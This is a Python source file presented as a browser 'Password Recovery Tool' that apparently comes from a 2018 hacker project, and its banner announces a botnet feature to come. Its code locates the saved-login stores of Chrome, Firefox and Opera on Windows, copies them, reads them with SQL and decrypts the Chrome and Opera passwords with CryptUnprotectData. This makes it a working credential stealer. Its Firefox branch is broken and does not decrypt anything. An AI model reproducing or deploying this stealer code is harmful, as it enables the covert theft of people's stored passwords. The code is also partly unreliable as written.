#                    __
#               ,-~¨^  ^¨-,           _,
#    ALERT!    /          / ;^-._...,¨/
#   WINDOWS   /          / /         / (G)reetz to b33ck, ang33l, cater, v4p0r, rebeld
#      USER  /          / /         /
#           /          / /         /
#          /,.-:''-,_ / /         / (Osiris Script 2018)
#          _,.-:--._ ^ ^:-._ __../  (R) - João (@hackerftsg)
#        /^         / /¨:.._¨__.;   (P)assword Recovery Tool
#       /          / /      ^  /    (B)otnet Setup - Em breve / Coming soon
#      /          / /         /     (V)ersion 1.0
#     /          / /         /
#    /_,.--:^-._/ /         /
#   ^            ^¨¨-.___.:^
#                                   CÓPIA NÃO COMÉDIA
# PT-BR: Avisos
# -------------
# Nessa versão pode conter alguns bugs, ainda irei arrumá-los na próxima commit.
#
# EN-US: Notices
# --------------
# In this version may contain some bugs, I will still fix them in the next commit.
#
# Exemplo / Example
# -----------------
# from osiris import *
# chrome = Chrome().get
# firefox = Firefox().get
# opera = Opera().get
#
# (C)opyright 2018 @hackerftsg


#region Imports
import os
import sqlite3
import shutil
import win32crypt
import re
import json
#endregion

#region Constants
APP_DATA = os.path.expanduser('~') + r'\AppData'
#endregion

#region Google Chrome
class Chrome(object):
    def __init__(self):
        self.possible_paths = [APP_DATA + r'\Local\Google\Chrome\User Data\Default', APP_DATA +
                               r'\Local\Google\Chrome\User Data\{profile}']
        self.path = self.get_installation_path()
        if self.path is not None:
            self.credentials = self.get_credentials()
        else:
            self.credentials = []

    def get_installation_path(self):
        if not os.path.isdir(APP_DATA + r'\Local\Google\Chrome\User Data'):
            return None
        for file in os.listdir(APP_DATA + r'\Local\Google\Chrome\User Data'):
            if os.path.isdir(APP_DATA + r'\Local\Google\Chrome\User Data' + '\\' + file):
                if file == 'Default':
                    return self.possible_paths[0]
                if file.startswith('Profile'):
                    return self.possible_paths[1].format(profile=file)
        return None

    def get_credentials(self):
        try:
            shutil.copyfile(self.path + r'\Login Data', self.path + r'\Login Data.dat') 
            path = os.path.join(self.path, 'Login Data.dat')
            with sqlite3.connect(path) as conn:
                cursor = conn.cursor()
                cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
                encrypted = cursor.fetchall()
                decrypted = [(url, email, win32crypt.CryptUnprotectData(password, None, None, None, 0)[1].decode(
                        'utf-8')) for [url, email, password] in encrypted]
                return decrypted
        except:
            return None

    @property
    def get(self):
        return getattr(self, 'credentials', self.credentials)

    @get.setter
    def get(self, credentials):
        self.credentials = credentials
#endregion

#region Mozilla Firefox
class Firefox(object):
    def __init__(self):
        self.possible_login_files = ['logins.json', 'signons.sqlite']
        self.path = self.get_installation_path()
        if self.path is not None:
            self.credentials = self.get_credentials()
        else:
            self.credentials = []

    def get_installation_path(self):
        if os.path.isdir(APP_DATA + r'\Roaming\Mozilla\Firefox'):
            profile = re.findall(r'Path=Profiles/(.+)', open(APP_DATA + r'\Roaming\Mozilla\Firefox\profiles.ini',
                                                                'r').read())[0]
            path = APP_DATA + r'\Roaming\Mozilla\Firefox\Profiles\{profile}'
            return path.format(profile=profile)
        return None

    def get_credentials(self):
        for file in os.listdir(self.path):
            if os.path.isfile(self.path + '\\' + file):
                if file == self.possible_login_files[0]:
                    try:
                        shutil.copyfile(self.path + '\\' + file, self.path + '\\' + file + '.dat')
                        with open(self.path + '\\' + file + '.dat', 'r') as json_file:
                            data = json.load(json_file)
                            logins = data['logins']
                            logins = [(i['hostname'], i['encryptedUsername'], i['encryptedPassword']) for i in logins]
                            return logins
                    except:
                        return None
                if file == self.possible_login_files[1]:
                    try:
                        shutil.copyfile(self.path + '\\' + file, self.path + '\\' + file + '.dat')
                        path = os.path.join(self.path, file + '.dat')
                        with sqlite3.connect(path) as conn:
                            cursor = conn.cursor()
                            cursor.execute('SELECT hostname, encryptedUsername, encryptedPassword, encType FROM '
                                           'moz_logins')
                            decrypted = [(url, email, password) for [url, email, password] in encrypted]
                            return decrypted
                    except:
                        return None
        return None

    @property
    def get(self):
        return getattr(self, 'credentials', self.credentials)

    @get.setter
    def get(self, credentials):
        self.credentials = credentials
#endregion

#region Opera
class Opera(object):
    def __init__(self):
        self.path = self.get_installation_path()
        if self.path is not None:
            self.credentials = self.get_credentials()
        else:
            self.credentials = []

    def get_installation_path(self):
        if not os.path.isdir(APP_DATA + r'\Roaming\Opera Software\Opera Stable'):
            return None
        path = APP_DATA + r'\Roaming\Opera Software\Opera Stable'
        return path

    def get_credentials(self):
        try:
            shutil.copyfile(self.path + r'\Login Data', self.path + r'\Login Data.dat')
            path = os.path.join(self.path, 'Login Data.dat')
            with sqlite3.connect(path) as conn:
                cursor = conn.cursor()
                cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
                encrypted = cursor.fetchall()
                decrypted = [(url, email, win32crypt.CryptUnprotectData(password, None, None, None, 0)[1].decode(
                        'utf-8')) for [url, email, password] in encrypted]
                return decrypted
        except:
            return None

    @property
    def get(self):
        return getattr(self, 'credentials', self.credentials)

    @get.setter
    def get(self, credentials):
        self.credentials = credentials
#endregion
